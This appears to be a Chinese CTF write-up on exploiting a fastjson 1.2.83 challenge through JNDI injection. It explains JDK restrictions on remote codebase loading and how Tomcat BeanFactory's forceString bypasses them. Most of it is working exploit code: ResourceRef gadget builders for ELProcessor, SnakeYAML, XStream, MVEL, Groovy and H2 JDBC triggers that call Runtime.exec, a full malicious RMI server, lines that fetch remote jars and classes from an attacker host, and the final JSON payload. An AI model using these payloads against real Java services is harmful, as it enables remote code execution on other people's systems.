0x01 还原题目
=========

![image-20220906194219933](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-73f7dd991b8f9910ed5669bdb33866b6913c9dad.png)

源码内容不多，只有一个解析控制器，

```java
@RequestMapping({"/ApiTest"})
public class JsonApiTestController {
    @Autowired
    private ApiTestService apiTestService;

    public JsonApiTestController() {
    }

    @GetMapping({"/get"})
    public String getApiTest() {
        return this.apiTestService.getMsg().toString();
    }

    @PostMapping({"/post"})
    public String postApiTest(HttpServletRequest request) {
        ServletInputStream inputStream = null;
        String jsonStr = null;

        try {
            inputStream = request.getInputStream();
            StringBuffer stringBuffer = new StringBuffer();
            byte[] buf = new byte[1024];
            boolean var6 = false;

            int len;
            while((len = inputStream.read(buf)) != -1) {
                stringBuffer.append(new String(buf, 0, len));
            }

            inputStream.close();
            jsonStr = stringBuffer.toString();
            return ((Message)JSON.parseObject(jsonStr, Message.class)).toString();
        } catch (IOException var7) {
            var7.printStackTrace();
            return "Test fail";
        }
    }
}
```

主要关注到`/ApiTest/post`控制器，接收了传入的数据参数，并且使用`JSON.parseObject`函数解析数据，从而触发fastjson反序列化，

但是在这里fastjson的版本为`1.2.83`，目前是没有公布什么新的解析漏洞的，因此把目光转向题目自定义的类，给出了一个Test类，主要大致代码如下：

```java
public class Test {
    public Test() {
    }

    public static void main(String[] args) throws IOException, InterruptedException {
        String jsonStr = "{\"content\" : {\"@type\": \"ycb.simple_json.service.JNDIService\", \"target\":\"ldap://vps:port/xxx\"}, \"msg\":{\"$ref\":\"$.content.context\"}}";
        System.out.println(jsonStr);
        Object obj = ((Message)JSON.parseObject(jsonStr, Message.class)).toString();
        System.out.println(obj);
    }
}
```

运行输出结果为：

```json
{"content" : {"@type": "ycb.simple_json.service.JNDIService", "target":"ldap://vps:port/xxx"}, "msg":{"$ref":"$.content.context"}}
Message{msg='null'}
```

从这里的提示转而关注到`ycb.simple_json.service.JNDIService`，该类的代码如下

```java
@JSONType
public class JNDIService {
    private String target;
    private Context context;

    public JNDIService() {
    }

    public void setTarget(String target) {
        this.target = target;
    }

    public Context getContext() throws NamingException {
        if (this.context == null) {
            this.context = new InitialContext();
        }

        this.context.lookup(this.target);
        return this.context;
    }
}
```

可以看到两个函数：`setTarget`和`getContext`函数，json在解析`request`数据的时候会先通过set方法设置target，`"msg":{"$ref":"$.content.context"}`会触发调用`getContext`函数，从而使用`InitialContext.lookup`加载远程对象

但是如果直接

0x02 关于JNDI在低版本JDK的利用
=====================

> Java对象在JNDI中的存储方式:
> 
> - Java序列化
> - JNDI Reference
> - Marshalled对象
> - Remote Location (已弃用)

低版本没有限制任意加载`object factory`的时候漏洞出发流程大致如下

![image-20220907013338336](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-42615ecabc320b391e4e2d95c7ca4541b392555a.png)

很多时候RMI的使用 - 利用方式一
------------------

在很多时候，RMI服务的远程调用是通过rmi协议指定｀`host:port/xxx`向`RMIRegister注册中心`指定获得一个`Stub`,在这个Stub对象中,有`Server远程对象的通信地址和端口`然后客户端的Stub通过地址和端口连接到Server端监听的通信端口并提交参数,然后Stub返回执行结果给Client端, 所以在Client客户端看来就是Stub对象在本地执行了对象的方法

这种方式在低版本的JDK中也是存在漏洞的, `RMI注册中心`可以在一个绑定的对象中通过 `java.rmi.server.codebase` 属性设置一个`Codebase`，当RMI客户端远程加载这个远程对象时，RMI客户端根据返回的信息执行`lookup`操作, 在这个过程中，会先尝试在本地`CLASSPATH`中去获取对应的Stub类的定义，并从本地加载，但如果在本地无法找到，RMI客户端则会向远程Codebase去获取攻击者指定的恶意对象，这种方式将会受到 useCodebaseOnly 的限制。

从`JDK 6u45、7u21`开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从`CLASSPATH`和当前VM的`java.rmi.server.codebase` 指定路径加载类文件。

关键词:

1. Codebase + java.rmi.server.codebase
2. CLASSPATH + Stub类的定义
3. java.rmi.server.useCodebaseOnly
4. JDK 6u45、7u21

JNDI中RMI返回References - 利用方式二
----------------------------

但是除了以上方式之外, 在JNDI服务中RMI服务端还可以通过References类来绑定一个外部的远程对象（当前名称目录系统之外的对象）。在这种模式下,RMI服务端先通过Referenceable.getReference()获取绑定对象的引用并且保存在目录中,当用户全球的xxx刚好对应时就会返回一个References类替代原本的Stub.

1. 服务端通过Referenceable.getReference()获取绑定对象的引用并且保存在目录中
2. 客户端请求xxx绑定有对象引用, 则服务端返回对应的References

而之后客户端收到RMI服务端返回的References进如下处理:

1. 取出返回的References中指定的Factory
2. 执行lookup操作时,通过factory.getObjectInstance()获取外部远程对象实例
3. 向References中指定的Factory发出请求拿到.class文件
4. 动态加载返回的.class文件并完成实例化
5. 执行.class实例化对象的getObjectInstance()

低版本JDK下JNDI注入的过程便如上所述了,但是在高版本却不在能使用这种方法

在`JDK 6u132, JDK 7u122, JDK 8u113` 中Java提升了JNDI 限制了Naming/Directory服务中JNDI Reference远程加载Object Factory类的特性。系统属性 `com.sun.jndi.rmi.object.trustURLCodebase`，`com.sun.jndi.cosnaming.object.trustURLCodebase` 的默认值变为false，即默认不允许从远程的Codebase加载Reference的工厂类（Factory Class）。

关键字:

1. References
2. Codebase
3. .class文件动态加载 + object factory
4. getObjectInstance
5. JDK 6u132, JDK 7u122, JDK 8u113
6. com.sun.jndi.rmi.object.trustURLCodebase
7. com.sun.jndi.cosnaming.object.trustURLCodebase

JNDI对接LDAP服务 - 利用方式三
--------------------

原理和上面的JNDI对接RMI服务差不多, 主要是LDAP服务也支持返回一个JNDI Reference对象, 最后在LDAP服务端返回一个构造好的恶意`JNDI Reference对象`从而远程加载恶意的object factory

重点: LDAP服务的Reference远程加载Factory类不受 `com.sun.jndi.rmi.object.trustURLCodebase`、`com.sun.jndi.cosnaming.object.trustURLCodebase`等属性的限制, 这是因为它对类进行动态加载的过程并不是通过`RMI Class loading`完成而是URLClassLoader

2018年10月开始做出限制,`JDK 11.0.1、8u191、7u201、6u211`之后`com.sun.jndi.ldap.object.trustURLCodebase` 属性的默认值被调整为false

关键词:

1. JNDI Reference对象
2. com.sun.jndi.rmi.object.trustURLCodebase+com.sun.jndi.cosnaming.object.trustURLCodebase不受限
3. JDK 11.0.1、8u191、7u201、6u211
4. com.sun.jndi.cosnaming.object.trustURLCodebase
5. com.sun.jndi.ldap.object.trustURLCodebase
6. Codebase的值是通过ref.getFactoryClassLocation()获得

> LDAP可以为存储的Java对象指定多种属性：
> 
> - javaCodeBase
> - objectClass
> - javaFactory
> - javaSerializedData

0x03 高版本下的活动范围
==============

可以看到,高版本jdk通过一些`trustURLCodebase`变量限制了JNDI服务通过`Codebase`到指定地址去请求.class远程加载`object facory`攻击方式

1. 我们仍可以指定使用哪一个本地的`object factory`,这个`object factory`必须是`CLASSPATH`中的类,除此外还需满足两个条件:
    
    
    1. 实现 javax.naming.spi.ObjectFactory 接口
    2. 存在 getObjectInstance 方法
2. 除此之外,不管是高低版本JNDI服务都是可以返回一个序列化对象然后在客户端中进行反序列化的,所以如果有反序列化的gadget也是可以完成漏洞利用的
    
    如果需要反序列的话可以通过LDAP的 `javaSerializedData`反序列化gadget

0x04 可用类的筛选
===========

上面提到的两种方法反序列化就不必多说了,主要是找一个指定可用的`object factory`类,Tomcat依赖包中的`org.apache.naming.factory.BeanFactory`正好满足了所需的两个要求, 如果使用这个类作为指定的`object factory`可进行以下操作:

1. getObjectInstance() 中会通过反射的方式实例化Reference所指向的任意Bean Class
2. 会调用setter方法为实例化对象的所有的属性赋值
3. Bean Class的类名、属性、属性值，全都来自于Reference对象

需要注意: `beanFactory`要求传入的Reference为ResourceRef类(这就是为什么很多JNDI攻击的绑定对象中都会出现ResourceRef对象的原因)

目前可以实例化一个BeanClass并且会调用它的setter方法进行对象赋值, 那么对这个BeanClass有没有什么要求呢?答案是有的:

1. 有无参构造方法
2. setter方法必须为public且参数为一个String类型

到这里其实限制还是比较大的,就是只能做到`任意调用public且只有一个String单参数的setter方法`

然而有一个参数使得这个利用范围迅速地扩大了: forceString

forceString最终在`getObjectInstance`函数被使用,调用栈为:

```http
getObjectInstance:148, BeanFactory (org.apache.naming.factory)
getObjectInstance:332, NamingManager (javax.naming.spi)
decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry)
lookup:138, RegistryContext (com.sun.jndi.rmi.registry)
lookup:218, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:417, InitialContext (javax.naming)
main:10, LookTest
```

![image-20220907134022423](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-45ca54c3429a0e90f3473fda3d366be337a8eba1.png)

![image-20220907134057468](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-7574e3c17ed0ff84a62e6bca67926cf5d2078c94.png)

> 原因:
> 
> `beanFactory`会取出`ResourceRef`对象中的`forceString`参数进行如下示例的处理:
> 
> 假设参数值为`x1=a,x2=b,x3=c`
> 
> 1. 通过`,`分割得到三组字符串`x1=a`,`x2=b`,`x3=c`
> 2. 通过`=`对每组字符串进行分割进行处理,例如取出`x1=a`切割后分别是`x1`和`a`
> 3. 将第一个作为要设置的参数变量名,第二个作为函数名, 表示强制转换, 当要设置指定实例化后`BeanClass`对象的 x1属性时由原本的`setX1`方法强制转换为调用`a`方法进行参数设置
> 4. BeanClass对象需要设置哪些参数完全由我们的`ResourceRef`对象决定,我们完全可控所以就是如果原本需要设置BeanClass对象的变量`x1="xx11"`就会调用它的setX1("xx11")去将`x1`设为`xx11`,但是因为以上`forceString`的存在会变为调用`a("xx11")`
> 5. 后面对x2,x3的处理同于x1

所以就是,到这里我们就可以完成`任意public的String单参数函数`的调用了

属于BeanClass,且通过一个String参数就能执行危险操作的Class方法以下两个用的比较多:

1. javax.el.ELProcessor#eval 任意代码执行
    
    (注意,Tomcat7中不存在该类)
    
    参数示例:
    
    ```java
    "".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','whoami']).start()")
    ```
    
    ```java
    ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "",
           true, "org.apache.naming.factory.BeanFactory", null);
    ref.add(new StringRefAddr("forceString", "x=eval"));
    
    ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/bash','-c','/Applications/Calculator.app/Contents/MacOS/Calculator']).start()\")"));
    return ref;
    ```
2. groovy.lang.GroovyShell#evaluate 执行 Groovy 脚本
    
    参数示例:
    
    ```java
    println 'Hello World.'
    ```

0x05 回到题目 + 其他类的利用拓展
====================

在这里搜索了一下发现`ELProcessor`类并没有被加载进来,所以第一个自然也就不可用了,`GroovyShell`的搜索结果也是不存在

![image-20220907033003817](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-d7d445d800e51d77daaeb2d2593a914268ac6866.png)

但是除了这两个类之外其实还存在很多个类都是可以进行漏洞利用的,这里简单列出浅蓝师傅在[探索高版本 JDK 下 JNDI 漏洞的利用方法](https://tttang.com/archive/1405/#toc_0x03-jdbc-rce)里面提出其他利用类:

1. javax.management.loading.MLet#addClasspath+loadClass
    
    ```java
    private static ResourceRef tomcatMLet() {
       ResourceRef ref = new ResourceRef("javax.management.loading.MLet", null, "", "",
               true, "org.apache.naming.factory.BeanFactory", null);
       ref.add(new StringRefAddr("forceString", "a=loadClass,b=addURL,c=loadClass"));
       ref.add(new StringRefAddr("a", "javax.el.ELProcessor"));
       ref.add(new StringRefAddr("b", "http://127.0.0.1:2333/"));
       ref.add(new StringRefAddr("c", "Blue"));
       return ref;
    }
    ```
2. groovy.lang.GroovyClassLoader#addClasspath+loadClass
    
    ```java
    private static ResourceRef tomcatGroovyClassLoader() {
       ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "",
               true, "org.apache.naming.factory.BeanFactory", null);
       ref.add(new StringRefAddr("forceString", "a=addClasspath,b=loadClass"));
       ref.add(new StringRefAddr("a", "http://127.0.0.1:8888/"));
       ref.add(new StringRefAddr("b", "blue"));
       return ref;
    }
    ```
    
    在http://127.0.0.1:8888/下面写入一个**blue.groovy**文件
    
    ```java
    @groovy.transform.ASTTest(value={assert Runtime.getRuntime().exec("calc")})
    class Person{}
    ```
3. org.yaml.snakeyaml.Yaml#load
    
    ```java
    private static ResourceRef tomcat_snakeyaml(){
       ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "",
               true, "org.apache.naming.factory.BeanFactory", null);
       String yaml = "!!javax.script.ScriptEngineManager [\n" +
               "  !!java.net.URLClassLoader [[\n" +
               "    !!java.net.URL [\"http://127.0.0.1:8888/exp.jar\"]\n" +
               "  ]]\n" +
               "]";
       ref.add(new StringRefAddr("forceString", "a=load"));
       ref.add(new StringRefAddr("a", yaml));
       return ref;
    }
    ```
4. new com.thoughtworks.xstream.XStream#fromXML
    
    `new com.thoughtworks.xstream.XStream().fromXML(String)`同样符合条件
    
    ```java
    private static ResourceRef tomcat_xstream(){
       ResourceRef ref = new ResourceRef("com.thoughtworks.xstream.XStream", null, "", "",
               true, "org.apache.naming.factory.BeanFactory", null);
       String xml = "<java.util.PriorityQueue serialization='custom'>\n" +
               "  <unserializable-parents/>\n" +
               "  <java.util.PriorityQueue>\n" +
               "    <default>\n" +
               "      <size>2</size>\n" +
               "    </default>\n" +
               "    <int>3</int>\n" +
               "    <dynamic-proxy>\n" +
               "      <interface>java.lang.Comparable</interface>\n" +
               "      <handler class='sun.tracing.NullProvider'>\n" +
               "        <active>true</active>\n" +
               "        <providerType>java.lang.Comparable</providerType>\n" +
               "        <probes>\n" +
               "          <entry>\n" +
               "            <method>\n" +
               "              <class>java.lang.Comparable</class>\n" +
               "              <name>compareTo</name>\n" +
               "              <parameter-types>\n" +
               "                <class>java.lang.Object</class>\n" +
               "              </parameter-types>\n" +
               "            </method>\n" +
               "            <sun.tracing.dtrace.DTraceProbe>\n" +
               "              <proxy class='java.lang.Runtime'/>\n" +
               "              <implementing__method>\n" +
               "                <class>java.lang.Runtime</class>\n" +
               "                <name>exec</name>\n" +
               "                <parameter-types>\n" +
               "                  <class>java.lang.String</class>\n" +
               "                </parameter-types>\n" +
               "              </implementing__method>\n" +
               "            </sun.tracing.dtrace.DTraceProbe>\n" +
               "          </entry>\n" +
               "        </probes>\n" +
               "      </handler>\n" +
               "    </dynamic-proxy>\n" +
               "    <string>calc</string>\n" +
               "  </java.util.PriorityQueue>\n" +
               "</java.util.PriorityQueue>";
       ref.add(new StringRefAddr("forceString", "a=fromXML"));
       ref.add(new StringRefAddr("a", xml));
       return ref;
    }
    ```
5. org.mvel2.sh.ShellSession#exec
    
    解析MVEL表达式
    
    ```java
    private static ResourceRef tomcat_MVEL(){
       ResourceRef ref = new ResourceRef("org.mvel2.sh.ShellSession", null, "", "",
               true, "org.apache.naming.factory.BeanFactory", null);
       ref.add(new StringRefAddr("forceString", "a=exec"));
       ref.add(new StringRefAddr("a",
               "push Runtime.getRuntime().exec('calc');"));
       return ref;
    }
    ```
6. com.sun.glass.utils.NativeLibLoader#loadLibrary
    
    需要能够通过WEB功能或者写文件gadget上传一个动态链接库(例如下面的libcmd)来加载并执行命令。
    
    ```java
    private static ResourceRef tomcat_loadLibrary(){
       ResourceRef ref = new ResourceRef("com.sun.glass.utils.NativeLibLoader", null, "", "",
               true, "org.apache.naming.factory.BeanFactory", null);
       ref.add(new StringRefAddr("forceString", "a=loadLibrary"));
       ref.add(new StringRefAddr("a", "/../../../../../../../../../../../../tmp/libcmd"));
       return ref;
    }
    ```
7. org.apache.catalina.users.MemoryUserDatabaseFactory
    
    这里能做的事情很多,[XXE](https://tttang.com/archive/1405/#toc_xxe),[RCE](https://tttang.com/archive/1405/#toc_rce),[创建Tomcat管理员](https://tttang.com/archive/1405/#toc_tomcat),[写 Webshell](https://tttang.com/archive/1405/#toc_webshell)
8. org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory#configureDataSource
    
    ```java
    private static Reference tomcat_dbcp2_RCE(){
       return dbcpByFactory("org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory");
    }
    private static Reference tomcat_dbcp1_RCE(){
       return dbcpByFactory("org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory");
    }
    private static Reference commons_dbcp2_RCE(){
       return dbcpByFactory("org.apache.commons.dbcp2.BasicDataSourceFactory");
    }
    private static Reference commons_dbcp1_RCE(){
       return dbcpByFactory("org.apache.commons.dbcp.BasicDataSourceFactory");
    }
    private static Reference dbcpByFactory(String factory){
       Reference ref = new Reference("javax.sql.DataSource",factory,null);
       String JDBC_URL = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
               "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
               "java.lang.Runtime.getRuntime().exec('/System/Applications/Calculator.app/Contents/MacOS/Calculator')\n" +
               "$$\n";
       ref.add(new StringRefAddr("driverClassName","org.h2.Driver"));
       ref.add(new StringRefAddr("url",JDBC_URL));
       ref.add(new StringRefAddr("username","root"));
       ref.add(new StringRefAddr("password","password"));
       ref.add(new StringRefAddr("initialSize","1"));
       return ref;
    }
    ```
9. org.apache.tomcat.jdbc.pool.DataSourceFactory
    
    ```java
    private static Reference tomcat_JDBC_RCE(){
       return dbcpByFactory("org.apache.tomcat.jdbc.pool.DataSourceFactory");
    }
    private static Reference dbcpByFactory(String factory){
       Reference ref = new Reference("javax.sql.DataSource",factory,null);
       String JDBC_URL = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
               "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
               "java.lang.Runtime.getRuntime().exec('/System/Applications/Calculator.app/Contents/MacOS/Calculator')\n" +
               "$$\n";
       ref.add(new StringRefAddr("driverClassName","org.h2.Driver"));
       ref.add(new StringRefAddr("url",JDBC_URL));
       ref.add(new StringRefAddr("username","root"));
       ref.add(new StringRefAddr("password","password"));
       ref.add(new StringRefAddr("initialSize","1"));
       return ref;
    }
    ```
10. com.alibaba.druid
    
    ```java
    private static Reference druid(){
        Reference ref = new Reference("javax.sql.DataSource","com.alibaba.druid.pool.DruidDataSourceFactory",null);
        String JDBC_URL = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
                "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
                "java.lang.Runtime.getRuntime().exec('/System/Applications/Calculator.app/Contents/MacOS/Calculator')\n" +
                "$$\n";
        String JDBC_USER = "root";
        String JDBC_PASSWORD = "password";
    
        ref.add(new StringRefAddr("driverClassName","org.h2.Driver"));
        ref.add(new StringRefAddr("url",JDBC_URL));
        ref.add(new StringRefAddr("username",JDBC_USER));
        ref.add(new StringRefAddr("password",JDBC_PASSWORD));
        ref.add(new StringRefAddr("initialSize","1"));
        ref.add(new StringRefAddr("init","true"));
        return ref;
    }
    ```
11. Deserialize
    
    **dbcp**
    
    ```java
    ResourceRef ref = new ResourceRef("org.apache.commons.dbcp2.datasources.SharedPoolDataSource", null, "", "",
                    true, "org.apache.commons.dbcp2.datasources.SharedPoolDataSourceFactory", null);
    ref.add(new BinaryRefAddr("jndiEnvironment", Files.readAllBytes(Paths.get("calc.bin"))));
    ```
    
    **mchange-common**
    
    ```java
    ResourceRef ref = new ResourceRef("java.lang.String", null, "", "", true, "com.mchange.v2.naming.JavaBeanObjectFactory", null);
    ref.add(new BinaryRefAddr("com.mchange.v2.naming.JavaBeanReferenceMaker.REF_PROPS_KEY", Files.readAllBytes(Paths.get("calc.bin"))));
    ```
    
    **hessian**
    
    ```java
    LookupRef ref = new LookupRef("java.lang.String","look");
    ref.add(new StringRefAddr("factory", "com.caucho.hessian.client.HessianProxyFactory"));
    //com.caucho.burlap.client.BurlapProxyFactory
    ref.add(new StringRefAddr("type", "java.lang.AutoCloseable"));
    ref.add(new StringRefAddr("url", "http://127.0.0.1:6666/"));
    ```

0x06 找到可用类
==========

在上面众多的可用类中逐一进行类检索,最后可以找到`org.yaml.snakeyaml.Yaml#load(java.lang.String)`已载入项目中, 使用这个Yaml的load方法完成RCE(使用该方法需要使用项目额外生成一个.jar包: <https://github.com/artsploit/yaml-payload>)

```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class RMIServer {
    private static ResourceRef eLProcessor(){
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/bash','-c','/Applications/Calculator.app/Contents/MacOS/Calculator']).start()\")"));
        System.out.println("请检查当前项目是否存在javax.el.ELProcessor#eval");
        return ref;
    }

    private static ResourceRef groovyShell(){
        ResourceRef ref = new ResourceRef("\"groovy.bugs.Autobox.Util.printByte(\\\"1\\\", Byte.valueOf((byte)1));\"", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=evaluate"));
//        ref.add(new StringRefAddr("x", "Runtime.getRuntime().exec(\"calc\");"));
        ref.add(new StringRefAddr("x", "groovy.bugs.Autobox.Util.printByte(\"1\", Byte.valueOf((byte)1));"));
        System.out.println("请检查当前项目是否存在groovy.lang.GroovyShell#evaluate");
        return ref;
    }

    private static ResourceRef tomcatMLet() {
        ResourceRef ref = new ResourceRef("javax.management.loading.MLet", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=loadClass,b=addURL,c=loadClass"));
        ref.add(new StringRefAddr("a", "javax.el.ELProcessor"));
        ref.add(new StringRefAddr("b", "http://127.0.0.1:2333/"));
        ref.add(new StringRefAddr("c", "Exploit"));
        System.out.println("请检查当前项目是否存在javax.management.loading.MLet");
        return ref;
    }

    private static ResourceRef tomcatGroovyClassLoader() {
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=addClasspath,b=loadClass"));
        ref.add(new StringRefAddr("a", "http://127.0.0.1/"));
        ref.add(new StringRefAddr("b", "blue"));
        System.out.println("请检查当前项目是否存在groovy.lang.GroovyClassLoader#loadClass");
        System.out.println("在vps的Server服务挂上一个blue.groovy文件,内容如下:");
        System.out.println("@groovy.transform.ASTTest(value={assert Runtime.getRuntime().exec(\"calc\")})class Person{}");
        return ref;
    }

    private static ResourceRef tomcat_snakeyaml(){
        ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        String yaml = "!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"http://127.0.0.1:80/yaml-payload.jar\"]\n" +
                "  ]]\n" +
                "]";
        ref.add(new StringRefAddr("forceString", "a=load"));
        ref.add(new StringRefAddr("a", yaml));
        System.out.println("请检查当前项目是否存在org.yaml.snakeyaml.Yaml#load");
        System.out.println("转到https://github.com/artsploit/yaml-payload 使用项目生产yaml-payload.jar放在http服务端下");
        return ref;
    }

    private static ResourceRef tomcat_xstream(){
        ResourceRef ref = new ResourceRef("com.thoughtworks.xstream.XStream", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        String xml = "<java.util.PriorityQueue serialization='custom'>\n" +
                "  <unserializable-parents/>\n" +
                "  <java.util.PriorityQueue>\n" +
                "    <default>\n" +
                "      <size>2</size>\n" +
                "    </default>\n" +
                "    <int>3</int>\n" +
                "    <dynamic-proxy>\n" +
                "      <interface>java.lang.Comparable</interface>\n" +
                "      <handler class='sun.tracing.NullProvider'>\n" +
                "        <active>true</active>\n" +
                "        <providerType>java.lang.Comparable</providerType>\n" +
                "        <probes>\n" +
                "          <entry>\n" +
                "            <method>\n" +
                "              <class>java.lang.Comparable</class>\n" +
                "              <name>compareTo</name>\n" +
                "              <parameter-types>\n" +
                "                <class>java.lang.Object</class>\n" +
                "              </parameter-types>\n" +
                "            </method>\n" +
                "            <sun.tracing.dtrace.DTraceProbe>\n" +
                "              <proxy class='java.lang.Runtime'/>\n" +
                "              <implementing__method>\n" +
                "                <class>java.lang.Runtime</class>\n" +
                "                <name>       exec        </name>\n" +
                "                <parameter-types>\n" +
                "                  <class>java.lang.String</class>\n" +
                "                </parameter-types>\n" +
                "              </implementing__method>\n" +
                "            </sun.tracing.dtrace.DTraceProbe>\n" +
                "          </entry>\n" +
                "        </probes>\n" +
                "      </handler>\n" +
                "    </dynamic-proxy>\n" +
                "    <string>calc</string>\n" +
                "  </java.util.PriorityQueue>\n" +
                "</java.util.PriorityQueue>";
        ref.add(new StringRefAddr("forceString", "a=fromXML"));
        ref.add(new StringRefAddr("a", xml));
        System.out.println("请检查当前项目是否存在com.thoughtworks.xstream.XStream#fromXML");
        return ref;
    }

    private static ResourceRef tomcat_MVEL(){
        ResourceRef ref = new ResourceRef("org.mvel2.sh.ShellSession", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=exec"));
        ref.add(new StringRefAddr("a",
                "push Runtime.getRuntime().exec('calc');"));
        System.out.println("请检查当前项目是否存在org.mvel2.sh.ShellSession#exec");
        return ref;
    }

    private static ResourceRef tomcat_loadLibrary(){
        ResourceRef ref = new ResourceRef("com.sun.glass.utils.NativeLibLoader", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=loadLibrary"));
        ref.add(new StringRefAddr("a", "/../../../../../../../../../../../../tmp/libcmd"));
        System.out.println("该漏洞需要结合一个文件上传点上传一个'动态链接库文件',然后通过loadLibrary函数对这个动态链接库文件进行加载进而触发漏洞");
        return ref;
    }

    public static void main(String[] args) throws Exception{
        LocateRegistry.createRegistry(1099);

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(tomcat_snakeyaml());
        Naming.rebind("rmi://0.0.0.0:1099/Exploit",referenceWrapper);
        System.out.println("RMI Server Start Working...");

    }
}
```

运行之后在, 本地80端口开启一个http服务,并且将 **[yaml-payload](https://github.com/artsploit/yaml-payload)** 项目生产的`yaml-payload.jar`包放到目录下(执行什么命令由项目`AwesomeScriptEngineFactory.java`文件中的构造函数指定 ).

之后发送payload成功执行命令

```http
{"content" : {"@type": "ycb.simple_json.service.JNDIService", "target":"rmi://127.0.0.1:1099/Exploit"}, "msg":{"$ref":"$.content.context"}}
```

![image-20220907221624508](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-a95251fc86cfbbf65c3348c687665deada4bf25e.png)

![image-20220907211213752](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-b0f36138753f5117b66a24e0a829d01b6618a7a3.png)

![image-20220907211217167](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-d347185db70381c63f756ea03352925ed56b63f1.png)

0x07 学习链接
=========

[https://mp.weixin.qq.com/s?biz=MzAxNTg0ODU4OQ==&amp;mid=2650358440&amp;idx=1&amp;sn=e005f721beb8584b2c2a19911c8fef67&amp;chksm=83f0274ab487ae5c250ae8747d7a8dc7d60f8c5bdc9ff63d0d930dca63199f13d4648ffae1d0](https://mp.weixin.qq.com/s?biz=MzAxNTg0ODU4OQ==&mid=2650358440&idx=1&sn=e005f721beb8584b2c2a19911c8fef67&chksm=83f0274ab487ae5c250ae8747d7a8dc7d60f8c5bdc9ff63d0d930dca63199f13d4648ffae1d0)

[https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA\_nBDA](https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA)

[https://tttang.com/archive/1405/#toc\_mlet](https://tttang.com/archive/1405/#toc_mlet)